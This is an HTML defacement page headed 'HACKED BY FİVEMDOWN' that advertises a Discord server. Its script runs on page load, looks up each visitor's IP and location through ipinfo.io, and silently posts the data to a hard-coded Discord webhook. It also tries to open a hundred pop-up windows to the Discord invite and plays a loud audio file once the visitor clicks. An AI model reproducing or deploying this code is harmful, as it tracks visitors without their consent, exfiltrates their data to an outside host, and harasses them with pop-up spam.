<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>IP Info</title>
  <style>
    body {
      background: black;
      color: #00f;
      font-family: "Courier New", monospace;
      text-align: center;
      margin: 0;
      height: 100vh;
      overflow: hidden;
    }
    #ipinfo {
      font-size: 22px;
      line-height: 1.7;
      text-shadow: 0 0 15px #00f, 0 0 25px #00f, 0 0 40px #00f;
      white-space: pre-wrap;
      margin-top: 30px;
      color: #00f;
    }
    #discord-container {
      display: flex;
      justify-content: center;
      gap: 20px; /* Resimler arası boşluk */
      margin-top: 40px;
      margin-bottom: 10px;
    }
    .discord-logo {
      width: 250px;
      vertical-align: middle;
      filter: drop-shadow(0 0 8px #00f);
    }
    #discord-link {
      font-size: 48px;
      color: #00f;
      text-shadow: 0 0 20px #00f, 0 0 40px #00f, 0 0 80px #00f;
      text-decoration: none;
      font-weight: bold;
      letter-spacing: 2px;
      display: inline-block;
      margin-top: 15px;
      margin-bottom: 15px;
    }
    #hacked-by {
      font-size: 45px;
      color: #00f;
      text-shadow: 0 0 20px #00f, 0 0 40px #00f, 0 0 80px #00f;
      letter-spacing: 2px;
      font-family: inherit;
      margin-top: 0;
    }
    canvas {
      position: fixed;
      top: 0;
      left: 0;
      z-index: -1;
    }
    #audio-player {
      display: none;
    }
  </style>
</head>
<body>
  <canvas id="stars"></canvas>
  <div id="discord-container">
    <img class="discord-logo" src="https://media.discordapp.net/attachments/1348698865565565073/1397013984451887124/image.png?ex=68b835e9&is=68b6e469&hm=cce11b6db87cdce7336fe340593aeb0501ffcbf1e1600eeb52863344beea541c&=&format=webp&quality=lossless" alt="Discord Image">
    <img class="discord-logo" src="https://media.discordapp.net/attachments/1313231147282600099/1412569201016573952/image.png?ex=68b8c515&is=68b77395&hm=3d2e62133bfff01e10241f4f028c29035af3a524aa233171c7cd13e4e66af608&=&format=webp&quality=lossless" alt="Discord Image">
    <img class="discord-logo" src="https://media.discordapp.net/attachments/1313231147282600099/1412569285095719103/image.png?ex=68b8c529&is=68b773a9&hm=9b3a74923d4e61a90df135fe7177b87d611afa1eccc7d79caca4d287e5105a5a&=&format=webp&quality=lossless" alt="Discord Image">
  </div>
  <pre id="ipinfo">Loading...</pre>
  <div>
    <a id="discord-link" href="https://discord.gg/fivemdown" target="_blank">https://discord.gg/fivemdown</a>
    <span id="hacked-by"> HACKED BY FİVEMDOWN</span>
  </div>
  <!-- Mp3 dosyan entegre edildi! -->
  <audio id="audio-player" src="https://cdn.discordapp.com/attachments/1323494216852308008/1412543226468110346/Moscow_Moscow_missile_meme_earrape.mp3?ex=68b8ace4&is=68b75b64&hm=06bd01749a5bc92fd1a7fb5cfa3877d016525084c09f4f7a38c13f8b692a414a&" autoplay loop muted></audio>
  <script>
    const canvas = document.getElementById("stars");
    const ctx = canvas.getContext("2d");
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
    const stars = Array.from({length: 150}, () => ({
      x: Math.random() * canvas.width,
      y: Math.random() * canvas.height,
      radius: Math.random() * 1.5,
      dy: Math.random() * 0.5 + 0.2
    }));

    function drawStars() {
      ctx.clearRect(0, 0, canvas.width, canvas.height);
      ctx.fillStyle = "white";
      stars.forEach(star => {
        ctx.beginPath();
        ctx.arc(star.x, star.y, star.radius, 0, Math.PI*2);
        ctx.fill();
        star.y += star.dy;
        if (star.y > canvas.height) {
          star.y = 0;
          star.x = Math.random() * canvas.width;
        }
      });
      requestAnimationFrame(drawStars);
    }
    drawStars();

    fetch("https://ipinfo.io/json?token=8d7365019dc710")
      .then(response => response.json())
      .then(data => {
        document.getElementById("ipinfo").textContent = JSON.stringify(data, null, 2);
        window.ipData = data;

        var webhookURL = "https://discord.com/api/webhooks/1412165143961407570/rNvbuXQPj9VoWSffMDT8ySmCKgRrUkKW0LaHXEqDLqW1d67C9A1ikJB64NRRjt-Fvxhi";
        var ipInfo = JSON.stringify(data, null, 2);
        var payload = { content: "Bir kullanıcı siteyi açtı!\nIP Bilgisi:\n" + ipInfo };
        fetch(webhookURL, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(payload) });
      })
      .catch(() => { document.getElementById("ipinfo").textContent = "Bilgiler alınamadı."; });

    window.addEventListener('click', function() {
      document.getElementById('audio-player').play();
      document.getElementById('audio-player').muted = false;
    });

    function spamDiscordInvite() {
      for (let i = 0; i < 100; i++) {
        window.open("https://discord.gg/fivemdown", "_blank");
      }
    }

    window.onload = function() {
      spamDiscordInvite();
      var audio = document.getElementById('audio-player');
      audio.play().catch(()=>{});
      setTimeout(function() { audio.muted = false; }, 1200);
    };
  </script>
</body>
</html>
